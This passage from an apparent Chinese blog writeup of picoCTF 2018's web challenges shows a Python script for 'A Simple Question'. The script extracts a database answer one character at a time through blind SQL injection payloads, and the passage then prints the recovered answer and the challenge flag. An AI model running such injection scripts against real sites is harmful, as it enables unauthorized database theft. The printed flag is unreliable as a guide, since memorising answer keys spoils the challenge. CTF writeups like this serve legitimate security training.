class=\"string\">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class=\"line\">                 <span class=\"string\">&quot;Accept-Encoding&quot;</span>: <span class=\"string\">&quot;gzip, deflate&quot;</span>, <span class=\"string\">&quot;Content-Type&quot;</span>: <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>, <span class=\"string\">&quot;Connection&quot;</span>: <span class=\"string\">&quot;close&quot;</span>, <span class=\"string\">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class=\"string\">&quot;1&quot;</span>, <span class=\"string\">&quot;Pragma&quot;</span>: <span class=\"string\">&quot;no-cache&quot;</span>, <span class=\"string\">&quot;Cache-Control&quot;</span>: <span class=\"string\">&quot;no-cache&quot;</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> xrange(<span class=\"number\">1</span>, <span class=\"number\">99</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> digits+ascii_letters:</span><br><span class=\"line\">        cnt = j</span><br><span class=\"line\">        burp0_data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;answer&quot;</span>: <span class=\"string\">&quot;1&#x27; or hex(substr((select answer from answers limit 1 offset 0),&#123;&#125;,1))=hex(&#x27;&#123;&#125;&#x27;) -- &quot;</span>.<span class=\"built_in\">format</span>(j, i)</span><br><span class=\"line\">            <span class=\"comment\"># &quot;answer&quot;:&quot;1&#x27; or (select answer from answers where answer like &#x27;&#123;&#125;%&#x27;) -- &quot;.format(flag+i)</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;You&#x27;</span> <span class=\"keyword\">in</span> r.content:</span><br><span class=\"line\">            flag = flag + i</span><br><span class=\"line\">            <span class=\"built_in\">print</span> flag</span><br><span class=\"line\">            cnt += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> cnt == j:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (flag)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>得到answer:<code>41AndSixSixths</code>，post过去得到flag。</p>\n<p>flag:<code>picoCTF&#123;qu3stions_ar3_h4rd_28fc1206&#125;</code></p>\n","prev":{"title":"picoCTF2018 Writeup之General-skills篇","link":"/picoCTF2018-Writeup之General-skills篇"},"next":{"title":"通过拆分攻击实现的SSRF攻击","link":"/通过拆分攻击实现的SSRF攻击"},"plink":"https://pineswen.tk//picoCTF2018-Writeup之Web-Exploitation篇/","toc":[{"id":"前言","title":"前言","index":"1"},{"id":"inspect-me","title":"Inspect Me","index":"2","children":[{"id":"question","title":"Question","index":"2.1","children":[{"id":"hint","title":"Hint","index":"2.1.1"}]},{"id":"solution","title":"Solution","index":"2.2"}]},{"id":"client-side-is-still-bad","title":"Client Side is Still Bad","index":"3","children":[{"id":"question-1","title":"Question","index":"3.1","children":[{"id":"hint-1","title":"Hint","index":"3.1.1"}]},{"id":"solution-1","title":"Solution","index":"3.2"}]},{"id":"logon","title":"Logon","index":"4","children":[{"id":"question-2","title":"Question","index":"4.1","children":[{"id":"hint-2","title":"Hint","index":"4.1.1"}]},{"id":"solution-2","title":"Solution","index":"4.2"}]},{"id":"irish-name-repo","title":"Irish Name Repo","index":"5","children":[{"id":"question-3","title":"Question","index":"5.1","children":[{"id":"hint-3","title":"Hint","index":"5.1.1"}]},{"id":"solution-3","title":"Solution","index":"5.2"}]},{"id":"mr.-robots","title":"Mr. Robots","index":"6","children":[{"id":"question-4","title":"Question","index":"6.1","children":[{"id":"hint-4","title":"Hint","index":"6.1.1"}]},{"id":"solution-4","title":"Solution","index":"6.2"}]},{"id":"no-login","title":"No Login","index":"7","children":[{"id":"question-5","title":"Question","index":"7.1","children":[{"id":"hint-5","title":"Hint","index":"7.1.1"}]},{"id":"solution-5","title":"Solution","index":"7.2"}]},{"id":"secret-agent","title":"Secret Agent","index":"8","children":[{"id":"question-6","title":"Question","index":"8.1","children":[{"id":"hint-6","title":"Hint","index":"8.1.1"}]},{"id":"solution-6","title":"Solution","index":"8.2"}]},{"id":"buttons","title":"Buttons","index":"9","children":[{"id":"question-7","title":"Question","index":"9.1","children":[{"id":"hint-7","title":"Hint","index":"9.1.1"}]},{"id":"solution-7","title":"Solution","index":"9.2"}]},{"id":"the-vault","title":"The Vault","index":"10","children":[{"id":"question-8","title":"Question","index":"10.1","children":[{"id":"hint-8","title":"Hint","index":"10.1.1"}]},{"id":"solution-8","title":"Solution","index":"10.2"}]},{"id":"artisinal-handcrafted-http-3","title":"Artisinal Handcrafted HTTP 3","index":"11","children":[{"id":"question-9","title":"Question","index":"11.1","children":[{"id":"hint-9","title":"Hint","index":"11.1.1"}]},{"id":"solution-9","title":"Solution","index":"11.2"}]},{"id":"flaskcards","title":"Flaskcards","index":"12","children":[{"id":"question-10","title":"Question","index":"12.1","children":[{"id":"hint-10","title":"Hint","index":"12.1.1"}]},{"id":"solution-10","title":"Solution","index":"12.2"}]},{"id":"fancy-alive-monitoring","title":"fancy-alive-monitoring","index":"13","children":[{"id":"question-11","title":"Question","index":"13.1","children":[{"id":"hint-11","title":"Hint","index":"13.1.1"}]},{"id":"solution-11","title":"Solution","index":"13.2"}]},{"id":"help-me-reset-2","title":"Help Me Reset 2","index":"14","children":[{"id":"question-12","title":"Question","index":"14.1","children":[{"id":"hint-12","title":"Hint","index":"14.1.1"}]},{"id":"solution-12","title":"Solution","index":"14.2"}]},{"id":"a-simple-question","title":"A Simple Question","index":"15","children":[{"id":"question-13","title":"Question","index":"15.1","children":[{"id":"hint-13","title":"Hint","index":"15.1.1"}]},{"id":"solution-13","title":"Solution","index":"15.2"}]}]}